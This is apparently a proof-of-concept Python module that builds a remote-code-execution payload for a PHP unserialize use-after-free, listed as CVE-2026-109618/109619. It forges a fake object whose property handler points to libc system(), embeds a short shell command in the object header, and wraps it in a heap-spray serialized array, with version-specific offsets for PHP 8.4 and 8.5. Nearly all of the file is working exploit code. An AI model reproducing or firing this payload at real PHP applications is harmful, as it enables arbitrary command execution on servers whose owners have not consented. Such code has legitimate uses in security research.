#!/usr/bin/env python3
# INDEX: forge stdclass system() fire payload | all | resolved addresses + gpf offset
"""Canonical UAF->RCE fire-payload builder (CVE-2026-109618 / CVE-2026-109619).

Forge a stdClass whose handlers->get_properties_for is libc system() and whose
fake object's 16-byte GC header carries a <=14-byte shell command, then wrap it
in the var_hash-UAF spray envelope. Pure byte construction: no transport, no
printing. The caller supplies the resolved addresses, the version-specific
get_properties_for handler offset (gpf_off: 200 on 8.5, 192 on 8.4), and the
spray geometry constants of its own engine module. Pure stdlib, safe under
python3 -I.
"""
from __future__ import annotations

import os
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)


def build_fire_payload(ce, system, spray_addr, cmd, gpf_off, *,
                       spray_len, spray_count, c_part, ref_base,
                       exit0_wrap=True):
    """Build the fire spray payload bytes.

    Forge a stdClass whose handlers->get_properties_for is libc system(); its
    first 16 bytes (the gc header) are the shell command. cmd is at most 14
    bytes; a leading 0x09 is prepended so GC_ADDREF's +1 turns it into 0x0A
    (newline, ignored by sh).

    gpf_off is the get_properties_for slot (last field of zend_object_handlers)
    for this build: 200 on 8.5, 192 (0xC0) on 8.4.26's 200-byte handler table.

    WORKER SURVIVAL (exit0_wrap): the forged get_properties_for handler is libc
    system(); its RETURN VALUE (the shell wait-status) is handed back to the
    engine AS the prop_ht HashTable*. A command that exits 0 -> status 0 ->
    prop_ht = NULL. exit0_wrap forces that zero exit by appending ';true' when it
    fits the 14-byte command budget. It keeps the worker alive ONLY when the app
    dispatch sink null-checks get_properties_for's return before using it
    (get_object_vars(), (array)$o, foreach, var_export -- `test %rax,%rax; je`);
    a serialize() ECHO sink derefs the return via zend_array_count with no null
    check and SIGSEGVs regardless of exit code. Pass exit0_wrap=False for the
    plain crash-and-spray fire; the out-of-band marker lands either way.
    """
    if isinstance(cmd, str):
        cmd = cmd.encode("latin-1")
    if exit0_wrap:
        if not cmd.endswith(b";true") and len(cmd) + 5 <= 14:
            cmd = cmd + b";true"
    assert len(cmd) <= 14, f"command {cmd!r} is {len(cmd)} bytes (max 14)"
    payload_cmd = b"\x09" + cmd  # GC_ADDREF turns 0x09 -> 0x0A (newline; sh ignores)

    sp = bytearray(spray_len)
    fake_obj_addr = spray_addr + 104

    struct.pack_into('<Q', sp, 40, fake_obj_addr)        # stale bucket zval.value
    struct.pack_into('<I', sp, 48, 0x08)                 # stale bucket zval.type = OBJECT
    sp[104:104 + len(payload_cmd)] = payload_cmd         # fake_obj gc header = command
    sp[104 + len(payload_cmd)] = 0
    struct.pack_into('<Q', sp, 120, ce)                  # fake_obj.ce       (+0x10)
    struct.pack_into('<Q', sp, 128, spray_addr)          # fake_obj.handlers (+0x18)
    struct.pack_into('<Q', sp, 136, 1)                   # fake_obj.properties(+0x20)
    struct.pack_into('<Q', sp, gpf_off, system)          # handlers+gpf_off -> get_properties_for
    sp = bytes(sp)

    total = 1 + spray_count + 1
    parts = [f'i:0;{c_part}'.encode('latin-1')]
    for i in range(spray_count):
        parts.append(f'i:{i+1};s:{spray_len}:"'.encode('latin-1') + sp + b'";')
    parts.append(f'i:{spray_count+1};R:{ref_base};'.encode('latin-1'))
    return b'a:' + str(total).encode() + b':{' + b''.join(parts) + b'}'
